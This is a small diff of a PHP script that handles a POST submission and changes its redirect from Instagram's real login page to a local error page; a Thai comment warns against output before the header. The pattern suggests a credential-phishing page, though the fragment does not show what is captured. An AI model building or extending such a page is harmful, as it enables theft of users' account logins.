@@ -18,7 +18,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             ]);
 
             // ไม่ echo อะไรออกไปก่อน header
-            header("Location: https://www.instagram.com/accounts/login/");
+            header("Location: error.html");
             exit();
 
         } catch (Exception $e) {
